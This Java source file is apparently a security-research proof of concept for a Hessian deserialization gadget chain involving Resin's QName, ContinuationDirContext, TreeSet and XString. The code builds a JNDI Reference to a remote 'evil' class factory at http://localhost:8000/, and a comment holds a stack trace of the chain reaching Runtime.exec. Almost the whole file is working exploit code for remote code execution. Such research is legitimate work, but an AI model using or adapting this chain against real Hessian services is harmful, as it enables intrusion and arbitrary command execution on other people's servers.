package com.javasec.pocs.hessian.resin;

import com.caucho.naming.QName;
import com.javasec.utils.SerializeUtils;

import javax.naming.CannotProceedException;
import javax.naming.Reference;
import javax.naming.directory.DirContext;
import java.lang.reflect.Constructor;
import java.util.Hashtable;
import java.util.TreeSet;

/**
 * exec:347, Runtime (java.lang)
 * <clinit>:7, evil
 * forName0:-1, Class (java.lang)
 * forName:348, Class (java.lang)
 * loadClass:72, VersionHelper12 (com.sun.naming.internal)
 * loadClass:61, VersionHelper12 (com.sun.naming.internal)
 * getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
 * getObjectInstance:319, NamingManager (javax.naming.spi)
 * getContext:439, NamingManager (javax.naming.spi)
 * getTargetContext:55, ContinuationContext (javax.naming.spi)
 * composeName:180, ContinuationContext (javax.naming.spi)
 * toString:353, QName (com.caucho.naming)
 * equals:392, XString (com.sun.org.apache.xpath.internal.objects)
 * compareTo:441, Rdn$RdnEntry (javax.naming.ldap)
 * compareTo:420, Rdn$RdnEntry (javax.naming.ldap)
 * put:568, TreeMap (java.util)
 * add:255, TreeSet (java.util)
 * readLengthList:93, CollectionDeserializer (com.caucho.hessian.io)
 * readObject:2075, Hessian2Input (com.caucho.hessian.io)
 * HessianDeserial:272, SerializeUtils (com.javasec.utils)
 * main:24, TreesetTostringChain (com.javasec.pocs.hessian.resin)
 */
public class TreesetTostringChain {
    public static void main(String[] args) throws  Exception {
        Reference refObj=new Reference("evil","evil","http://localhost:8000/");
        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext"); //$NON-NLS-1$
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);
        CannotProceedException cpe = new CannotProceedException();
        cpe.setResolvedObj(refObj);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());
        QName qName = new QName(ctx, "boo", "gii");
        TreeSet treeSetWithXString = (TreeSet) SerializeUtils.makeTreeSetWithXString(qName);
        SerializeUtils.HessianDeserial(SerializeUtils.HessianSerial(treeSetWithXString));
    }
}
